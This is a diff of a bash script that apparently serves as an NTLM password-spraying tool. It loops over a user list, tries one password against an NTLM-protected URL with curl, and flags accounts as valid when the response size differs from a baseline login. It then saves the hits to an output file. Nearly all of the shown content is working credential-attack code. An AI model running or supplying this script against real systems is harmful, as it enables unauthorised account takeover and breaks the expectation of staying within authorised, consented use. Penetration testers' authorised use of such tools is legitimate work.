@@ -28,20 +28,39 @@ if [ ! -s $USERS ];then
 	exit 1
 fi
 
+RETRCODE=`curl -s -w '%{http_code}' -o /dev/null $URL`
+if [ $RETRCODE -ne 401 ];then
+	echo "Is it really an ntlm-authenticated site?"
+	echo "bye..."
+	exit 1
+fi
 
-if [ -d output ];then
-	rm -f output/*
-else
-	mkdir output
-	if [ $? -ne 0 ];then
-		echo "Error creating output dir. Bye..."
-		exit 1
-	fi
+BASERETR=`curl -s -w '%{size_download}' -k -L --ntlm --user "xxxxxxxxxxx:yyyyyyyyyyy" -o /dev/null  $URL`
+OUTFILE="eatmyshorts-output-`date +%d%b%H%M`.txt"
+> $OUTFILE
+if [ $? -ne 0 ];then
+	echo "Error generating output file here on $PWD ! check permissions..."
+	exit 1
 fi
 
 cat $USERS | while read user
 do
 	echo "Testing $user ..."
-	curl -k -L --ntlm --user "${user}:${PASS}" $URL -o output/${user}.html
+	RETRSIZE=`curl -s -w '%{size_download}' -k -L --ntlm --user "${user}:${PASS}" $URL -o output/${user}.html`
+	if [ $RETRSIZE -ne $BASERETR ];then
+		echo -e "[*] Valid credential found!!! -> \033[32m${user}\033[0m "
+		echo $user >> $OUTFILE
+	fi
 done
-                                                                                                     
+
+echo "Done."
+echo
+if [ -s $OUTFILE ];then
+	echo "We've found some creds! Valid credentials/users are in $OUTFILE "
+else
+	echo "No valid creds found with $PASS"
+fi
+echo
+echo "Adios muchacho!!"
+echo
+exit 0
